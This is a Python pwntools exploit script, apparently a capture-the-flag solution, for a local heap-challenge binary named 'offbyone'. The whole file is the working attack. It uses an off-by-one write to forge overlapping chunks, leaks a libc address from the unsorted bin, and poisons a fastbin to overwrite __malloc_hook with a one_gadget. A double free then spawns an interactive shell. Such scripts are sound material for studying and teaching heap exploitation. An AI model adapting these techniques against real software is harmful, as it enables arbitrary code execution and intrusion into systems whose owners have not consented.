#!/usr/bin/env python2
# coding = utf-8
# Environment: Ubuntu 16.04

from pwn import *
from LibcSearcher import *
context(arch = "amd64", os = "linux", log_level = "debug")

def send_choice(choice):
    p.recvuntil('>')
    p.sendline(str(choice))

def new_data(size, data):
    send_choice(1)
    p.recvuntil('size ?')
    p.sendline(str(size))
    p.recvuntil('data:')
    p.send(data)

def delete_data(index):
    send_choice(2)
    p.recvuntil('index?')
    p.sendline(str(index))

def show_data(index):
    send_choice(3)
    p.recvuntil('index?')
    p.sendline(str(index))

def edit_data(index, data):
    send_choice(4)
    p.recvuntil('index?')
    p.sendline(str(index))
    p.recvuntil('data?')
    p.send(data)

p = process('./offbyone')
elf = ELF('./offbyone')
gdb.attach(p, '')

"""
Heap Layout:
|--------------------
|chunk used to do off-by-one
|--------------------
|chunk to do overlap
|--------------------
|chunk to be overlapped
|--------------------
|isolating chunk(from top)
|--------------------
|top chunk(lefted)
|--------------------
SmallBin: 0x80 < size < 0x400
"""

# Step 1: Forge an overlapped chunk
new_data(0x28, 'a') # Chunk 0
new_data(0xf0, 'a') # Chunk 1
new_data(0x60, '/bin/sh\x00') # Chunk 2
new_data(0x60, '/bin/sh\x00') # Chunk 3
edit_data(0, '\x00' * 0x28 + '\x71') # Forge Chunk 1's size to overlap Chunk 2
delete_data(1) # After free, Free Chunk 1's size is (0x170 | PREV_INUSE), overlapped Chunk 2, enetered unsorted bin

# Step 2: Leak libc via freed unsortedbin chunk's fd & bk
new_data(0xf0, '\x08') # Chunk 1
show_data(1)
libc_malloc_hook_offsetP_f8 = u64(p.recv(6) + '\x00\x00') # leaked __malloc_hook + 0xf8
__malloc_hook_libc = libc_malloc_hook_offsetP_f8 - 0xf8
libc = LibcSearcher('__malloc_hook', __malloc_hook_libc)
libc_base = __malloc_hook_libc - libc.dump('__malloc_hook')
system_libc = libc_base + libc.dump('system')
log.info('libc_base: ' + hex(libc_base))
log.info('system_libc: ' + hex(system_libc))

# Step 3: Get double allocate chunk to exploit double free, write __malloc_hook to one_gadget
new_data(0x60, '/bin/sh\x00') # Chunk 4 (Double allocated Chunk 2)
__malloc_hook_offsetN_23 = __malloc_hook_libc - 0x23
delete_data(4)
edit_data(2, p64(__malloc_hook_offsetN_23))
new_data(0x60, 'a') # Chunk 4
one_gadget = libc_base + 0xf03a4
new_data(0x60, '\x00' * 0x13 + p64(one_gadget))

# Step 4: Trigger malloc one_gadget using double free
delete_data(2)
delete_data(4)
p.interactive()
